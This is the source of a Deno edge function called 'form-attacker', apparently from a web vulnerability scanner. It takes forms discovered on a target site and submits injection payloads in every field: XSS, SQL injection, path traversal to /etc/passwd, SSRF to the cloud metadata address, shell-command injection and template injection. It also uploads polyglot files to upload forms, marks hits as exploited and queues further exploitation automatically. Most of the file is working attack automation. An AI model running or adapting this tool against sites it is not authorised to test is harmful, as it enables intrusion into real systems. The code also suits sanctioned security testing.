// form-attacker — POSTs every discovered form with attack payloads in every
// field, and tries each polyglot file against multipart upload forms.
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { recordFinding } from "../_shared/findings-writer.ts";
import { POLYGLOTS, PROOF } from "../_shared/polyglot-files.ts";
import { checkLoopGuard, recordLoopRun } from "../_shared/loop-guard.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};
const SUPA = Deno.env.get("SUPABASE_URL")!;
const SVC = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const MAX_MS = 42000;
const start = Date.now();
const tl = () => MAX_MS - (Date.now() - start);

const FIELD_PAYLOADS = [
  `"><svg onload=alert('${PROOF}')>`,
  `' OR '1'='1`,
  `../../../../etc/passwd`,
  `http://169.254.169.254/`,
  `; echo ${PROOF}`,
  `{{7*7}}`,
];

async function safeFetch(url: string, init: RequestInit, ms = 6000) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), ms);
  try { return await fetch(url, { ...init, signal: ctrl.signal }); } finally { clearTimeout(t); }
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  const ok = (b: any) => new Response(JSON.stringify(b), { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } });

  try {
    const { targetId } = await req.json().catch(() => ({}));
    if (!targetId) return ok({ ok: false, error: "targetId required" });
    const db = createClient(SUPA, SVC);

    const { data: forms } = await db.from("discovered_forms")
      .select("*").eq("target_id", targetId).limit(40);

    let submissions = 0, uploads = 0, findings = 0;

    for (const f of forms || []) {
      if (tl() < 3000) break;
      const fields: any[] = (f.fields as any[]) || [];

      // Form payload submissions (one POST per attack payload, fields filled in)
      for (const payload of FIELD_PAYLOADS) {
        if (tl() < 3000) break;
        const body = new URLSearchParams();
        for (const field of fields) {
          const n = field?.name || "input";
          body.set(n, payload);
        }
        try {
          const r = await safeFetch(f.action_url, {
            method: (f.method || "POST").toUpperCase(),
            headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "CyberScope/2.0" },
            body: body.toString(),
          }, 6000);
          submissions++;
          const txt = (await r.text().catch(() => "")).slice(0, 4000);
          if (txt.includes(PROOF) || /SQL syntax|onerror=|root:x:0:0/i.test(txt)) {
            findings++;
            await recordFinding({
              targetId,
              source: "form-attacker",
              category: "form_injection",
              vulnClass: "form_injection",
              title: `Form-attack hit @ ${f.action_url}`,
              description: `form-attacker submitted '${payload}' into all ${fields.length} fields and observed an injection marker in the response.`,
              severity: "high",
              payload,
              proofTier: "exploited",
              autoEnqueueExploit: true,
              evidence: { method: f.method, fields: fields.map((x: any) => x.name), bodySnippet: txt.slice(0, 800), templateId: "form_injection", affected_url: f.action_url },
              request: { method: (f.method || "POST").toUpperCase(), url: f.action_url, body: body.toString() },
              response: { status: r.status, body: txt },
            });
          }
        } catch { /* continue */ }
      }

      // Upload polyglot tests against multipart forms
      if (f.has_file_upload || /multipart/i.test(f.enctype || "")) {
        for (const poly of POLYGLOTS) {
          if (tl() < 3000) break;
          try {
            const fd = new FormData();
            for (const field of fields) {
              const n = field?.name || "field";
              if (field?.type === "file") fd.append(n, new Blob([poly.bytes], { type: poly.contentType }), poly.filename);
              else fd.append(n, "test");
            }
            // Always include at least one file field
            if (![...fd.keys()].some((k) => fd.get(k) instanceof Blob)) {
              fd.append("file", new Blob([poly.bytes], { type: poly.contentType }), poly.filename);
            }
            const r = await safeFetch(f.action_url, { method: "POST", body: fd }, 8000);
            uploads++;
            const txt = (await r.text().catch(() => "")).slice(0, 4000);
            if (txt.includes(poly.marker) || txt.includes(PROOF)) {
              findings++;
              await recordFinding({
                targetId,
                source: "form-attacker",
                category: poly.vulnClass,
                vulnClass: poly.vulnClass,
                title: `Upload-fuzz proven (${poly.vulnClass}) @ ${f.action_url}`,
                description: `Polyglot ${poly.filename} echoed marker '${poly.marker}' in upload response — server processed/stored attacker-controlled content.`,
                severity: poly.vulnClass.includes("rce") ? "critical" : "high",
                payload: poly.filename,
                proofTier: "exploited",
                autoEnqueueExploit: true,
                evidence: { vuln_class: poly.vulnClass, templateId: poly.vulnClass, filename: poly.filename, bodySnippet: txt.slice(0, 800), affected_url: f.action_url },
                response: { status: r.status, body: txt },
              });
            }
          } catch { /* continue */ }
        }
      }

      await db.from("discovered_forms").update({ last_attacked_at: new Date().toISOString() }).eq("id", f.id);
    }

    await db.from("scan_logs").insert({
      target_id: targetId, log_type: findings ? "warning" : "info",
      message: `📨 Form-attacker: ${forms?.length || 0} forms, ${submissions} submissions, ${uploads} upload tests, ${findings} findings`,
      metadata: { forms: forms?.length || 0, submissions, uploads, findings },
    });
    return ok({ ok: true, forms: forms?.length || 0, submissions, uploads, findings });
  } catch (e) {
    return ok({ ok: false, error: e instanceof Error ? e.message : "err" });
  }
});
